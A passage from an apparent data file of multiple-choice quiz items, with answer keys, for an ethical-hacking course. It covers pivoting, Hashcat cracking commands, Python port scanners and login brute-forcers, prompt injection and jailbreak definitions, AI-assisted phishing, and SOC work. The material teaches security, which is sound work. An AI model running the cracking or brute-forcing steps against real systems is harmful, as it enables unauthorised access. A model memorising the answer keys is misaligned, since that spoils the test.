          "What best describes 'pivoting' in the context of lateral movement?",
        options: [
          "Routing traffic through a compromised host to reach network segments not directly reachable from the attacker's own machine",
          "Cracking a password hash offline using a pivot table of common substitutions",
          "Switching from a reverse shell to a bind shell mid-session",
          "Changing the attacker's own IP address to avoid detection",
        ],
        correctIndex: 0,
        explanation:
          "Pivoting uses an already-compromised host as a relay/proxy to access otherwise-unreachable internal network segments.",
      },
    ],
  },
  {
    topicId: "m11-10",
    questions: [
      {
        question:
          "What is the correct general methodology to follow for each VulnMachines box in this lab?",
        options: [
          "Recon (Nmap) -> identify a vulnerable service/version -> exploit -> privesc -> capture the flag",
          "Privesc -> recon -> exploit -> flag -> Nmap",
          "Exploit blindly with Metasploit before running any recon",
          "Capture the flag first, then work backward to document the exploit",
        ],
        correctIndex: 0,
        explanation:
          "A structured methodology starts with recon to find attack surface, then moves through identification, exploitation, and privilege escalation before the flag is captured.",
      },
      {
        question:
          "According to the lab's expected write-up format, which element should be included for each machine?",
        options: [
          "The privesc path taken to reach root/admin, alongside recon findings and exploitation steps",
          "Only the final flag value, with no supporting methodology",
          "The target's purchase price on VulnMachines",
          "A full packet capture of every byte sent, with no summary",
        ],
        correctIndex: 0,
        explanation:
          "The specified write-up format explicitly calls for target overview, recon findings, exploitation steps, privesc path, flag, and lessons learned.",
      },
      {
        question:
          "Why does an Nmap scan typically come first in each machine's methodology?",
        options: [
          "It identifies live services and versions, which point toward specific known vulnerabilities to research and exploit",
          "It automatically exploits any vulnerability it finds",
          "It cracks any password hashes found on the target",
          "It is only useful after root/admin access has already been obtained",
        ],
        correctIndex: 0,
        explanation:
          "Recon with Nmap surfaces the open services and versions that let you research applicable exploits before attempting anything against the box.",
      },
    ],
  },
  {
    topicId: "m11-11",
    questions: [
      {
        question:
          "Before selecting a Hashcat mode for a hash in the provided list, what should you check first?",
        options: [
          "The hash's length/format, to determine whether it's MD5, SHA-256, or another type, and pick the matching -m value",
          "Whether the file has a .txt extension",
          "The victim machine's operating system version",
          "Whether rockyou.txt has already been used in a previous lab",
        ],
        correctIndex: 0,
        explanation:
          "Different hash algorithms produce different length/format outputs, and picking the wrong -m mode means Hashcat won't recognize the hash type correctly.",
      },
      {
        question:
          "Which command targets the SHA-256 hash batch specifically, per this lab's terminal commands?",
        options: [
          "hashcat -m 1400 sha256_hashes.txt rockyou.txt",
          "hashcat -m 0 sha256_hashes.txt rockyou.txt",
          "john --format=md5 sha256_hashes.txt",
          "hydra -m 1400 sha256_hashes.txt rockyou.txt",
        ],
        correctIndex: 0,
        explanation:
          "Mode 1400 in Hashcat corresponds to SHA2-256, matching the sha256_hashes.txt file, while mode 0 is reserved for MD5.",
      },
      {
        question:
          "What should be documented after running Hashcat against the full hash list?",
        options: [
          "Which passwords cracked instantly versus which required additional rule sets",
          "Only the total runtime of the command, with no other detail",
          "The IP address of the machine that generated the hashes",
          "Nothing, since Hashcat produces its own report automatically",
        ],
        correctIndex: 0,
        explanation:
          "The lab explicitly calls for noting which passwords cracked quickly versus which needed more advanced rule-based mutation, to build intuition about password strength.",
      },
    ],
  },
  {
    topicId: "m12-1",
    questions: [
      {
        question: "Which statement about Python's core types is accurate?",
        options: [
          "Python is dynamically typed, so variables like int, float, str, and bool need no explicit type declaration",
          "Python requires every variable to be declared with an explicit type before use",
          "Python has no boolean type and uses 1/0 integers instead",
          "Python strings must be declared with a fixed maximum length",
        ],
        correctIndex: 0,
        explanation:
          "Python is dynamically typed: you assign a value and its type is inferred at runtime, with no declaration syntax required.",
      },
      {
        question:
          "What is the purpose of a try/except block in a security script?",
        options: [
          "To catch and handle runtime errors gracefully instead of letting the script crash",
          "To speed up network requests by skipping error checking entirely",
          "To declare a function's expected input types",
          "To import external libraries conditionally based on OS",
        ],
        correctIndex: 0,
        explanation:
          "try/except lets a script catch anticipated errors (like a division by zero or a failed connection) and handle them without crashing the whole program.",
      },
      {
        question:
          "Which of these libraries is specifically useful for crafting raw network packets in Python security scripts?",
        options: ["scapy", "hashlib", "argparse", "datetime"],
        correctIndex: 0,
        explanation:
          "scapy is the security-relevant library for packet crafting, while hashlib handles hashing, argparse handles CLI arguments, and datetime handles dates/times.",
      },
    ],
  },
  {
    topicId: "m12-2",
    questions: [
      {
        question: "What does `socket.socket(AF_INET, SOCK_STREAM)` create?",
        options: [
          "A TCP socket using IPv4 addressing",
          "A UDP socket using IPv6 addressing",
          "An HTTP client session",
          "A raw ICMP ping socket",
        ],
        correctIndex: 0,
        explanation:
          "AF_INET selects IPv4 addressing and SOCK_STREAM selects the TCP (stream) protocol, together forming a standard TCP/IPv4 socket.",
      },
      {
        question:
          "Why does `.connect_ex()` get used instead of `.connect()` in a Python port scanner?",
        options: [
          "connect_ex() returns an error code instead of raising an exception on failure, making it easier to test many ports in a loop",
          "connect_ex() is faster because it skips the TCP handshake entirely",
          "connect_ex() only works with UDP sockets",
          "connect_ex() automatically retries failed connections",
        ],
        correctIndex: 0,
        explanation:
          "connect_ex() returns an integer error indicator rather than throwing an exception, which simplifies looping over many ports without wrapping each attempt in try/except.",
      },
      {
        question:
          "Why should you always set a timeout on sockets and requests in a security script?",
        options: [
          "An unresponsive host would otherwise hang the script indefinitely while waiting for a response",
          "Timeouts are required by Python syntax and the script won't run without one",
          "Timeouts automatically encrypt the connection",
          "Timeouts make requests.post() send data faster",
        ],
        correctIndex: 0,
        explanation:
          "Without a timeout, a socket or HTTP request will block forever on an unresponsive host, which would stall automation scripts that need to move through many targets.",
      },
    ],
  },
  {
    topicId: "m12-3",
    questions: [
      {
        question:
          "What is the correct sequence of operations the MAC changer script performs to change an interface's MAC address?",
        options: [
          "Bring the interface down, change the address, bring the interface back up",
          "Change the address, then bring the interface down, then up",
          "Bring the interface up, then down, then change the address",
          "Only bring the interface down; the address changes automatically",
        ],
        correctIndex: 0,
        explanation:
          "The interface must be brought down before its hardware address can be changed via `ip link set address`, then brought back up to resume normal operation.",
      },
      {
        question:
          "Why does the script validate the new MAC address against a regex before touching the interface?",
        options: [
          "To catch malformed input early and avoid passing garbage to a system command that modifies network configuration",
          "Because regex is required by Python's socket module",
          "To automatically generate a random MAC if none is provided",
          "Because subprocess calls fail silently unless input is regex-validated first",
        ],
        correctIndex: 0,
        explanation:
          "Validating input format before it's used in a subprocess call to `ip link` prevents malformed values from being passed into a command that reconfigures the network interface.",
      },
      {
        question: "What role does the `subprocess` module play in this script?",
        options: [
          "It lets the Python script call the system's `ip link` command to actually change the interface's address",
          "It is used only to read the argparse flags",
          "It provides the regex validation logic",
          "It replaces the need for sudo privileges",
        ],
        correctIndex: 0,
        explanation:
          "subprocess is how the script shells out to `ip link set dev ... down/address/up`, since changing a MAC address is done through the OS network stack, not pure Python.",
      },
    ],
  },
  {
    topicId: "m12-4",
    questions: [
      {
        question:
          "In the port scanner script, what does a return value of 0 from `connect_ex()` indicate?",
        options: [
          "The port is open",
          "The port is closed or filtered",
          "The host is completely unreachable",
          "The scan has timed out",
        ],
        correctIndex: 0,
        explanation:
          "connect_ex() returns 0 specifically on a successful connection, meaning the port accepted the TCP handshake and is open; any other value indicates failure.",
      },
      {
        question:
          "This Python TCP connect-scan port scanner mirrors which Nmap scan type?",
        options: [
          "Nmap's -sT (TCP connect scan)",
          "Nmap's -sS (SYN stealth scan)",
          "Nmap's -sU (UDP scan)",
          "Nmap's -O (OS detection)",
        ],
        correctIndex: 0,
        explanation:
          "A full TCP connect() (or connect_ex()) to each port is exactly what Nmap's -sT scan performs at a lower level, unlike -sS which only sends a SYN and doesn't complete the handshake.",
      },
      {
        question:
          "Why does the script print each open port as soon as it's found, rather than waiting until the entire scan finishes?",
        options: [
          "To give live feedback during a long-running scan across many ports",
          "Because Python cannot store results in a list",
          "Because sockets can only be used once per script run",
          "To avoid triggering intrusion detection systems",
        ],
        correctIndex: 0,
        explanation:
          "Printing results as they're discovered lets the user see progress and results in real time instead of waiting in silence for a scan spanning many ports.",
      },
    ],
  },
  {
    topicId: "m12-5",
    questions: [
      {
        question:
          "How does the subdomain brute-forcer script build each URL it tests?",
        options: [
          "By combining each wordlist entry with the target domain as http://{sub}.{domain}",
          "By appending the wordlist entry as a URL path, e.g. http://{domain}/{sub}",
          "By querying a DNS server directly using the socket module",
          "By requesting a certificate transparency log API",
        ],
        correctIndex: 0,
        explanation:
          "The script loops a subdomain wordlist and constructs each candidate as a subdomain prefix of the target, e.g. http://www.example.com, http://mail.example.com, etc.",
      },
      {
        question:
          "What does a 200 status code from one of the constructed URLs indicate in this script?",
        options: [
          "That the subdomain is live and resolvable, so it gets printed as a finding",
          "That the domain does not exist at all",
          "That the wordlist has been exhausted",
          "That the request timed out",
        ],
        correctIndex: 0,
        explanation:
          "A 200 OK response means the request succeeded, which the script treats as evidence that the guessed subdomain actually exists and resolves.",
      },
      {
        question:
          "Why does the script wrap each request in a try/except for `requests.ConnectionError`?",
        options: [
          "To skip non-existent subdomains cleanly instead of crashing when a DNS lookup or connection fails",
          "To automatically retry failed subdomains three times",
          "To enable HTTPS support",
          "Because requests.get() cannot function without exception handling",
        ],
        correctIndex: 0,
        explanation:
          "Most guessed subdomains won't exist, causing a connection error; catching it lets the loop continue to the next candidate instead of terminating the script.",
      },
    ],
  },
  {
    topicId: "m12-6",
    questions: [
      {
        question:
          "How does the login brute-forcer script detect a successful login attempt?",
        options: [
          "By checking whether a specific 'needle' string (e.g. 'Welcome back') appears in the response text",
          "By checking whether the HTTP status code is 404",
          "By measuring the response time of each request",
          "By checking whether the response is empty",
        ],
        correctIndex: 0,
        explanation:
          "The script looks for a needle string that only appears on a successful login page, since login endpoints often return 200 regardless of success or failure.",
      },
      {
        question:
          'What does the `data={}` parameter do in `requests.post(target, data={"username": "admin", "password": password})`?',
        options: [
          "It sends the given key-value pairs as form-encoded POST body data to the login endpoint",
          "It sets HTTP headers for the request",
          "It specifies the URL query string parameters",
          "It encrypts the password before sending",
        ],
        correctIndex: 0,
        explanation:
          "The data parameter in requests.post() sends the dictionary as application/x-www-form-urlencoded body content, which is how most HTML login forms submit credentials.",
      },
      {
        question:
          "Why does the topic stress running this brute-forcer only against your own lab targets like DVWA?",
        options: [
          "Because it's a noisy, easily detected technique that could violate authorization/law if run against systems you don't own or have permission to test",
          "Because DVWA is the only web application built with Python",
          "Because the script only works on localhost for technical reasons",
          "Because DVWA has no login form to brute-force",
        ],
        correctIndex: 0,
        explanation:
          "Login brute-forcing generates a flood of failed authentication attempts that is easily logged and detected, and running it without authorization would be illegal.",
      },
    ],
  },
  {
    topicId: "m12-7",
    questions: [
      {
        question:
          "According to this topic, what is a genuinely good use of AI when writing security scripts?",
        options: [
          "Scaffolding a script's structure and explaining unfamiliar code",
          "Skipping code review entirely since the AI is always correct",
          "Directly deploying AI-generated exploits against production systems untested",
          "Storing real client credentials in the prompt for better context",
        ],
        correctIndex: 0,
        explanation:
          "The topic highlights scaffolding structure, explaining code, and spotting insecure patterns as legitimate uses, while warning that generated code still needs validation.",
      },
      {
        question:
          "What does this topic warn against when using public AI tools like ChatGPT for security scripting?",
        options: [
          "Pasting real credentials, internal hostnames, or client data into the prompt",
          "Using AI to explain unfamiliar syntax",
          "Asking AI to scaffold a script's basic structure",
          "Using AI to identify missing input validation",
        ],
        correctIndex: 0,
        explanation:
          "Sensitive data pasted into a public AI tool's prompt may be logged, retained, or used for training, so real credentials/client data should never be included.",
      },
      {
        question:
          "Why should AI-generated security scripts always be tested in an isolated lab environment first?",
        options: [
          "Because generated code hasn't been validated and could behave unexpectedly or unsafely if run operationally",
          "Because AI-generated code cannot run outside a sandbox",
          "Because Python scripts require a special AI-only runtime",
          "Because lab environments automatically fix any bugs in the script",
        ],
        correctIndex: 0,
        explanation:
          "AI-generated code, like any unreviewed code, needs to be validated for correctness and safety before it's trusted to run against real systems.",
      },
    ],
  },
  {
    topicId: "m13-1",
    questions: [
      {
        question:
          "How do AI, ML, and Deep Learning relate to one another according to this topic?",
        options: [
          "They are nested layers: AI is the broad goal of simulating decisions, ML is a subset that learns from labelled data, and DL is a further subset using layered neural networks",
          "They are three unrelated, competing technologies with no overlap",
          "ML is broader than AI, and DL is broader than both",
          "AI, ML, and DL are simply different names for the same technique",
        ],
        correctIndex: 0,
        explanation:
          "The topic explicitly frames these as nested layers, not synonyms, with AI as the umbrella concept and ML/DL as increasingly specialized subsets.",
      },
      {
        question:
          "Which example best illustrates a Machine Learning (not Deep Learning) security application from this topic?",
        options: [
          "Learning from past attacks to flag future ones, such as phishing/brute-force detection",
          "Detecting malware behaviourally without any line-by-line code review",
          "A smart firewall making simple rule-based decisions",
          "Auto-discovering features from raw log data using layered neural networks",
        ],
        correctIndex: 0,
        explanation:
          "ML is described as trained on labelled data to find patterns, exemplified by learning from historical attacks to flag phishing or brute-force attempts, distinct from DL's behavioural/auto-feature-discovery role.",
      },
      {
        question:
          "What capability is specifically attributed to Deep Learning rather than basic ML in this topic?",
        options: [
          "Auto-discovering features for behavioural malware detection without manual code review",
          "Simulating human decision-making in general",
          "Basic phishing filter rules",
          "Manually labelling training data",
        ],
        correctIndex: 0,
        explanation:
          "DL's layered neural networks can auto-discover relevant features from large datasets, enabling behavioural detection of malware without needing manual, line-by-line analysis.",
      },
    ],
  },
  {
    topicId: "m13-2",
    questions: [
      {
        question:
          "Which of these is described as an offensive use of AI in cybersecurity?",
        options: [
          "AI-powered password recovery tools like PassGAN",
          "Automated incident response that isolates infected devices",
          "AI-powered spam/phishing filters",
          "AI code-vulnerability scanning with tools like GitHub Copilot",
        ],
        correctIndex: 0,
        explanation:
          "PassGAN and AI-generated phishing/deepfakes are listed as offensive uses, while spam filters, automated IR, and code scanning are listed as defensive uses.",
      },
      {
        question:
          "Which scenario best represents a defensive AI use case from this topic?",
        options: [
          "Flagging a login attempt from an unusual new country as anomalous",
          "Using AI to generate more convincing phishing emails",
          "Using AI to automate OSINT-driven reconnaissance against a target",
          "Using AI to evade malware detection",
        ],
        correctIndex: 0,
        explanation:
          "Anomaly detection, like flagging a login from an unexpected location, is explicitly listed as a defensive AI application.",
      },
      {
        question:
          "Why is AI described as 'dual-use' in the context of cybersecurity?",
        options: [
          "Because the same underlying AI techniques can be applied both to attack (phishing, evasive malware) and to defend (anomaly detection, filters)",
          "Because AI can only be used defensively, never offensively",
          "Because AI requires two separate models to function at all",
          "Because AI in security always requires human oversight to work",
        ],
        correctIndex: 0,
        explanation:
          "The topic frames AI as genuinely dual-use: the same class of capability serves both attackers and defenders, just aimed at different goals.",
      },
    ],
  },
  {
    topicId: "m13-3",
    questions: [
      {
        question:
          "Which of the following is listed as a key ethical concern with AI in hacking contexts?",
        options: [
          "Privacy violations from PII collection and lack of accountability",
          "AI models running too slowly to be useful",
          "AI being too expensive to license for security teams",
          "AI requiring too much electricity to run locally",
        ],
        correctIndex: 0,
        explanation:
          "The topic lists privacy violations (PII collection), lack of accountability, bias/discrimination, and weaponisation of AI capability as the key concerns.",
      },
      {
        question:
          "Which principle is explicitly named as part of ethical AI use in this topic?",
        options: [
          "Obtaining consent and being transparent",
          "Maximising the number of targets scanned per day",
          "Avoiding all documentation of AI-assisted findings",
          "Using AI only on production systems without authorization",
        ],
        correctIndex: 0,
        explanation:
          "The topic's ethical-use principles include following applicable laws, obtaining consent, being transparent, and preventing misuse.",
      },
      {
        question:
          "According to this topic, does the mere fact that AI can generate an attack script make running it legal or ethical?",
        options: [
          "No — authorization and ethical principles still apply regardless of what AI can technically generate",
          "Yes — AI-generated content is automatically authorized for use",
          "Yes, but only if the AI model is open-source",
          "It depends solely on the AI vendor's terms of service",
        ],
        correctIndex: 0,
        explanation:
          "The topic draws a direct parallel to any other tool in the course: capability doesn't equal authorization, so the same legal/ethical boundaries still apply.",
      },
    ],
  },
  {
    topicId: "m13-4",
    questions: [
      {
        question:
          "What is the minimum RAM recommended to comfortably run DeepSeek R1 locally via Ollama, per this topic?",
        options: [
          "16GB minimum, with 32GB recommended",
          "2GB minimum, with 4GB recommended",
          "128GB minimum, with 256GB recommended",
          "No RAM requirement is listed since it always runs in the cloud",
        ],
        correctIndex: 0,
        explanation:
          "The topic specifies 16GB RAM minimum (32GB recommended) and 20-50GB of storage, with GPU acceleration being optional.",
      },
      {
        question: "What is Ollama's role in this setup?",
        options: [
          "It manages model download, resource optimisation, and integration for running the model locally",
          "It is a cloud API that sends prompts to OpenAI's servers",
          "It is a Python library for socket programming",
          "It is a web browser extension for phishing detection",
        ],
        correctIndex: 0,
        explanation:
          "Ollama is the tool that handles pulling, running, and managing local AI models like deepseek-coder, abstracting away manual setup.",
      },
      {
        question:
          "What does the VS Code 'Continue' extension do in relation to a locally running Ollama model?",
        options: [
          "It auto-detects the local model and integrates it for in-editor AI assistance",
          "It uploads your code to a public AI service for review",
          "It replaces Ollama entirely with a cloud-hosted model",
          "It is required to install Ollama in the first place",
        ],
        correctIndex: 0,
        explanation:
          "The Continue extension is described as auto-detecting a locally running Ollama model so it can be used directly inside the editor.",
      },
    ],
  },
  {
    topicId: "m13-5",
    questions: [
      {
        question:
          "What is a practical use case for AI in reconnaissance, according to this topic?",
        options: [
          "Asking a local/AI model to generate a starter script for a specific recon task, then reviewing and adapting it",
          "Letting AI autonomously attack any target it discovers without oversight",
          "Using AI exclusively to write final pentest reports",
          "Replacing Nmap entirely since AI can scan networks without any tooling",
        ],
        correctIndex: 0,
        explanation:
          "The topic frames AI recon assistance as generating a starting point that a human then reviews and adapts, not as fully autonomous scanning.",
      },
      {
        question:
          "What must be checked before running an AI-suggested recon script, per this topic?",
        options: [
          "That it's validated against the authorised scope of the engagement",
          "That it was generated by a paid AI subscription rather than a free one",
          "That it uses only the Python standard library",
          "That it has been translated into a compiled binary",
        ],
        correctIndex: 0,
        explanation:
          "The topic explicitly warns to always validate AI-suggested recon scripts against the authorised scope before running them.",
      },
      {
        question:
          "Besides scripting, what other recon task can AI assist with according to this topic?",
        options: [
          "Scanning social media/public sites for personal info relevant to a spear-phishing risk assessment",
          "Physically breaking into a target's office",
          "Issuing legal subpoenas for target data",
          "Bypassing multi-factor authentication automatically",
        ],
        correctIndex: 0,
        explanation:
          "The topic notes AI can help scan public sources for personal information relevant to assessing spear-phishing risk, a form of OSINT automation.",
      },
    ],
  },
  {
    topicId: "m13-6",
    questions: [
      {
        question:
          "Which phishing type specifically targets executives, per the taxonomy in this topic?",
        options: ["Whaling", "Vishing", "Smishing", "Clone phishing"],
        correctIndex: 0,
        explanation:
          "Whaling is the term specifically for phishing attacks targeting high-value executives, distinct from vishing (phone) and smishing (SMS).",
      },
      {
        question:
          "Why does this topic say AI makes phishing more dangerous than older templated scams?",
        options: [
          "It fixes the spelling/grammar tells that used to be reliable red flags, making messages read as more polished and personalised",
          "It automatically bypasses all spam filters technically",
          "It requires no target research at all",
          "It only works over voice calls, not email",
        ],
        correctIndex: 0,
        explanation:
          "AI-generated phishing content is described as more polished and personalised, removing the poor grammar/spelling that used to help people spot scams.",
      },
      {
        question:
          "Which user protection is explicitly recommended in this topic against AI-enhanced phishing?",
        options: [
          "Enable 2FA everywhere and verify unsolicited urgent requests via a separate channel",
          "Disable email entirely",
          "Only use phone calls for all business communication",
          "Trust any message that uses correct grammar and spelling",
        ],
        correctIndex: 0,
        explanation:
          "The topic recommends 2FA, avoiding links in unsolicited urgent emails, and verifying via a separate channel as concrete protections.",
      },
    ],
  },
  {
    topicId: "m13-7",
    questions: [
      {
        question:
          "What is the difference between direct and indirect prompt injection?",
        options: [
          "Direct injection is the attacker's own prompt overriding the model's behaviour; indirect injection embeds malicious instructions in content the LLM is asked to analyse",
          "Direct injection only works on local models; indirect injection only works on cloud models",
          "Indirect injection requires physical access to the server running the model",
          "There is no meaningful difference between the two",
        ],
        correctIndex: 0,
        explanation:
          "Direct injection comes straight from the user's own prompt, while indirect injection hides instructions inside external content (a webpage, document) that the model later processes.",
      },
      {
        question:
          "How does this topic define 'jailbreaking' in relation to prompt injection?",
        options: [
          "Exploiting model vulnerabilities specifically to bypass safety guardrails",
          "The standard, sanctioned process for fine-tuning a model",
          "A defensive technique for filtering malicious input",
          "A method for encrypting prompts before sending them",
        ],
        correctIndex: 0,
        explanation:
          "Jailbreaking is described as a distinct technique from general prompt injection, focused specifically on defeating a model's built-in safety restrictions.",
      },
      {
        question:
          "Which of these is listed as a defence against prompt injection?",
        options: [
          "Isolating user input from system instructions and applying strict input validation/filtering",
          "Allowing any embedded webpage content to be treated as trusted system instructions",
          "Disabling all logging and monitoring of model interactions",
          "Giving every user prompt the same privilege level as system instructions",
        ],
        correctIndex: 0,
        explanation:
          "The topic lists strict input validation/filtering, isolating user input from system instructions, and ongoing monitoring as defences.",
      },
    ],
  },
  {
    topicId: "m13-8",
    questions: [
      {
        question:
          "Which vulnerability classes does this topic say AI code-review tools flag well?",
        options: [
          "SQL Injection, XSS, buffer overflows, and hardcoded passwords",
          "Only hardware-level side-channel attacks",
          "Only vulnerabilities in compiled C++ binaries",
          "Only issues in cloud infrastructure configuration",
        ],
        correctIndex: 0,
        explanation:
          "The topic explicitly lists SQL Injection, XSS, buffer overflows, and hardcoded passwords as vulnerability patterns AI tools flag well.",
      },
      {
        question:
          "Which tool is named specifically for customisable static-analysis scanning, alongside CodeQL and Copilot?",
        options: ["Semgrep", "Wireshark", "Hydra", "Hashcat"],
        correctIndex: 0,
        explanation:
          "Semgrep is named as a customisable scanning tool, alongside GitHub Copilot for inline suggestions and CodeQL for static analysis.",
      },
      {
        question:
          "How does this topic frame the proper role of AI in code security review?",
        options: [
          "As a useful second pair of eyes, not a replacement for actually understanding the code",
          "As a complete replacement for manual security review going forward",
          "As only useful for generating documentation, never for finding bugs",
          "As a tool that should be the sole reviewer with no human sign-off",
        ],
        correctIndex: 0,
        explanation:
          "The topic is explicit that AI review tools speed things up and add consistency but do not replace the need to actually understand the code.",
      },
    ],
  },
  {
    topicId: "m13-9",
    questions: [
      {
        question:
          "What is this lab's core exercise, building on the M12 subdomain brute-forcer?",
        options: [
          "Using AI to help extend the M12 script with concurrency/threading",
          "Rewriting the script from scratch in a different programming language",
          "Replacing the subdomain script with a paid commercial scanner",
          "Disabling error handling to make the script run faster",
        ],
        correctIndex: 0,
        explanation:
          "The lab specifically asks students to ask an AI model to extend the M12 subdomain script with concurrency/threading, building directly on the earlier module.",
      },
      {
        question:
          "What should you do with every AI-suggested code change in this lab, per its key points?",
        options: [
          "Review it line by line before running it",
          "Run it immediately without reading it, to save time",
          "Only review it if it fails on the first attempt",
          "Skip review since the AI model already tested it",
        ],
        correctIndex: 0,
        explanation:
          "The lab explicitly instructs reviewing every suggested change line by line before execution, consistent with the module's broader theme of validating AI output.",
      },
      {
        question: "What comparison does this lab ask you to make at the end?",
        options: [
          "The AI-assisted version's speed/accuracy against the original manual version",
          "The AI model's licensing cost versus a competitor's",
          "The number of lines of code versus the M11 hashcat lab",
          "The AI model's response time versus a human typing speed",
        ],
        correctIndex: 0,
        explanation:
          "The lab asks students to compare the AI-assisted script's speed and accuracy against the manually written version from M12.",
      },
    ],
  },
  {
    topicId: "m13-10",
    questions: [
      {
        question:
          "What is the actual purpose of generating a phishing email with AI in this lab?",
        options: [
          "A security-awareness exercise to annotate which elements make phishing convincing, not to target real people",
          "To send it to real employees at a partner company for testing",
          "To sell the template to spammers as a proof of concept",
          "To submit it as a bug bounty report against an email provider",
        ],
        correctIndex: 0,
        explanation:
          "The lab is explicit that this exercise is for awareness/training content only, and generated phishing content must never be sent to real people outside an authorised, scoped engagement.",
      },
      {
        question:
          "Which manipulation techniques are you asked to annotate in the generated phishing email?",
        options: [
          "Urgency, authority, fear, and fake branding",
          "Grammar mistakes and spelling errors only",
          "The email's file size and character count",
          "The sender's IP geolocation",
        ],
        correctIndex: 0,
        explanation:
          "The lab specifically calls out urgency, authority, fear, and fake branding as the manipulation techniques to identify and annotate.",
      },
      {
        question:
          "What kind of call-to-action does the lab suggest the generated email should include?",
        options: [
          "An urgency-driven call to action impersonating a known brand",
          "A calm, no-deadline request with no branding at all",
          "A request that requires no user action whatsoever",
          "A technical CVE disclosure with no persuasive element",
        ],
        correctIndex: 0,
        explanation:
          "The lab instructs generating an email that impersonates a known brand with an urgency-driven call to action, mirroring how real phishing campaigns operate.",
      },
    ],
  },
  {
    topicId: "m14-1",
    questions: [
      {
        question:
          "Which analogy does this topic use to describe the relationship between offensive and defensive security?",
        options: [
          "Defensive security is the 'castle' to offensive security's 'siege'",
          "Defensive security is the 'sword' to offensive security's 'shield'",
          "They are described as entirely unrelated disciplines",
          "Defensive security is described as obsolete compared to offensive security",
        ],
        correctIndex: 0,
        explanation:
          "The topic explicitly uses the castle-vs-siege analogy to frame defensive security as protecting assets against offensive attack.",
      },
      {
        question:
          "Which of these is listed as a core defensive security area in this topic?",
        options: [
          "Identity and Access Management (IAM)",
          "Payload staging",
          "Password spraying",
          "SUID binary abuse",
        ],
        correctIndex: 0,
        explanation:
          "IAM is listed alongside Network Security, Endpoint Security, Application Security, Threat Intelligence, Incident Response, and Security Awareness Training as core defensive areas.",
      },
      {
        question:
          "Why does this topic argue pentesters should understand defensive security?",
        options: [
          "It makes them a sharper, more realistic attacker by understanding what defenders actually look for",
          "It's a legal requirement to hold any pentesting certification",
          "It replaces the need to learn offensive tools entirely",
          "It's only relevant to SOC analysts, not pentesters",
        ],
        correctIndex: 0,
        explanation:
          "Understanding the defender's perspective helps a pentester anticipate detection and think more realistically about how an attack would actually be seen and stopped.",
      },
    ],
  },
  {
    topicId: "m14-2",
    questions: [
      {
        question:
          "What is the primary responsibility of a Tier 1 SOC analyst, per this topic?",
        options: [
          "First responder who monitors SIEM alerts and triages/escalates serious threats",
          "Building detection rules and proactively hunting hidden threats",
          "Conducting deep forensic investigations for legal proceedings",
          "Setting overall company security budget and policy",
        ],
        correctIndex: 0,
        explanation:
          "Tier 1 is described as the first responder, monitoring alerts and triaging/escalating anything serious to higher tiers.",
      },
      {
        question:
          "Which tier is responsible for investigating threats in depth and containing incidents?",
        options: [
          "Tier 2 (Incident Responder)",
          "Tier 1 (Junior Analyst)",
          "Tier 3 (Threat Hunter)",
          "None of the tiers handle containment",
        ],
        correctIndex: 0,
        explanation:
          "Tier 2 is described as investigating threats in depth, analysing malware/suspicious activity, and containing incidents.",
      },
      {
        question:
          "What distinguishes Tier 3 from Tiers 1 and 2 in this SOC structure?",
        options: [
          "Tier 3 proactively hunts hidden threats and performs deep forensic investigation, rather than reacting to alerts",
          "Tier 3 only handles password resets and account unlocks",
          "Tier 3 has no interaction with SIEM data at all",
          "Tier 3 is responsible solely for physical security",
        ],
        correctIndex: 0,
        explanation:
          "Tier 3 is the proactive, advanced tier: threat hunting and deep forensics, building detection rules rather than just responding to triaged alerts.",
      },
    ],
  },
  {
    topicId: "m14-3",
    questions: [
      {
        question:
          "What is the primary function of a SIEM in a blue team programme?",
        options: [
          "Aggregating and correlating logs across the organisation to detect suspicious patterns",
          "Cracking password hashes offline",
          "Generating phishing email templates for awareness training",
          "Automatically patching vulnerable software",
        ],
        correctIndex: 0,
        explanation:
          "SIEM (Security Information and Event Management) is described as the discipline that aggregates and correlates logs org-wide to surface suspicious patterns.",
      },
      {
        question:
          "What distinguishes DFIR from general Incident Response (IR)?",
        options: [
          "DFIR involves deep technical investigation after an incident, often for legal/evidentiary purposes",
          "DFIR only handles employee onboarding and access provisioning",
          "DFIR is a synonym for IR with no distinct scope",
          "DFIR is exclusively concerned with real-time alert triage",
        ],
        correctIndex: 0,
        explanation:
          "IR is the structured process for handling an active incident, while DFIR is described as the deeper forensic investigation that follows, often needed for legal evidence.",
      },
      {
        question: "What does IAM (Identity and Access Management) govern?",
        options: [
          "Who can access what, enforcing the principle of least privilege",
          "Which malware signatures are loaded into the antivirus engine",
          "Which network segments are reachable from the internet",
          "How log retention periods are configured in the SIEM",
        ],
        correctIndex: 0,
        explanation:
          "IAM is described as governing access rights and enforcing least privilege, distinct from SIEM (logging) or threat intelligence (IOCs/TTPs).",
      },
    ],
  },
  {
    topicId: "m14-4",
    questions: [
      {
        question:
          "How should the provided .evtx file be examined in Event Viewer, per this lab?",
        options: [
          "Load it into Event Viewer's Saved Logs pane, rather than reading it as a live log",
          "Convert it to a .txt file before opening it in Notepad",
          "Rename it to .log so Event Viewer will recognise it",
          "Open it directly with Wireshark instead of Event Viewer",
        ],
        correctIndex: 0,
        explanation:
          "The lab specifically directs loading the .evtx into the Saved Logs pane, since this is a provided file for investigation rather than the machine's own live event log.",
      },
      {
        question:
          "Which Event ID in this lab corresponds to a registry key change?",
        options: ["4657", "1074", "11707", "1033"],
        correctIndex: 0,
        explanation:
          "The lab lists 4657 as the registry key change event, while 1074 is the shutdown event and 11707/1033 relate to installation events.",
      },
      {
        question:
          "What is the reconstructed timeline of the malware infection in this lab?",
        options: [
          "Suspicious software installed -> it modified a Run registry key -> every login now triggers a shutdown",
          "A shutdown occurred first, which then triggered a malicious installation",
          "A registry key changed with no installation event ever occurring",
          "The malware was installed, uninstalled, and reinstalled twice",
        ],
        correctIndex: 0,
        explanation:
          "The lab's key points describe the exact chain: installation, followed by a Run key modification, followed by a shutdown triggered at every subsequent login.",
      },
    ],
  },
  {
    topicId: "m14-5",
    questions: [
      {
        question:
          "What should you check first when opening the provided PCAP in Wireshark, per this lab?",
        options: [
          "The Statistics view, for anything unusual in source/destination IPs and protocol breakdown",
          "The final packet in the capture, ignoring everything before it",
          "The PCAP's file size in bytes",
          "The DNS response times only",
        ],
        correctIndex: 0,
        explanation:
          "The lab recommends starting with the Statistics view to spot unusual IPs or protocol patterns before diving into individual packets.",
      },
      {
        question: "What does 'Follow -> TCP Stream' let you do in Wireshark?",
        options: [
          "View the full request/response conversation between two hosts as a reassembled stream",
          "Automatically decrypt any TLS traffic in the capture",
          "Block the selected IP address from further capture",
          "Export the PCAP file to a different capture format",
        ],
